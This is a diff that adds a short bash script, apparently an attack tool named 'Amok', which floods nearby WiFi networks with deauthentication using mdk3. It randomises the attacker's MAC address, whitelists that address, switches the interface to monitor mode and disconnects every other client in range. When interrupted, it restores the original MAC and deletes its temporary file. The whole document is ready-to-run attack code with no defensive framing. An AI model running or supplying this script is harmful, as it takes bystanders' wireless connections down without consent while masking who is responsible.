@@ -1,0 +1,54 @@
+#!/bin/bash
+
+iface=wlan0
+#assign variable "iface" with value of network interface used to attack
+#the interface will be in monitor mode
+
+###PRE-ATTACK###
+
+function getMac {
+#grep interfaces' mac address, then store it in a file
+    ifconfig | awk '/HWaddr/ {print $5}' > /tmp/whitelist.txt
+}
+
+###ATTACK###
+function startAmok {
+    ifconfig $iface down
+    macchanger -a $iface
+    getMac
+    iwconfig $iface mode monitor
+    mdk3 $iface d -w /tmp/whitelist.txt
+}
+
+###POST-ATTACK###
+function killMon {
+#kill monitor mode, change to managed mode
+#and bring the deult mac address back into interface
+    ifconfig $iface down
+    iwconfig $iface mode managed
+    macchanger -p $iface
+    ifconfig $iface up
+}
+
+###EXCEPTION###
+function control_c() {
+#when user press ctrl+c, i will do:
+    killMon
+    service network-manager restart
+    rm -f /tmp/whitelist.txt
+    clear
+    echo "[+]    Killing monitor mode ... "
+    sleep 0.3
+    echo "[+]    Getting the default MAC address back ..."
+    sleep 0.3
+    echo "[+]    Cleaning dumps up..."
+    sleep 0.3
+    echo "[+]    Done. Program Finished...!!!"
+exit
+}
+
+trap control_c SIGINT
+trap control_c SIGTERM
+
+################
+clear; startAmok #program execution
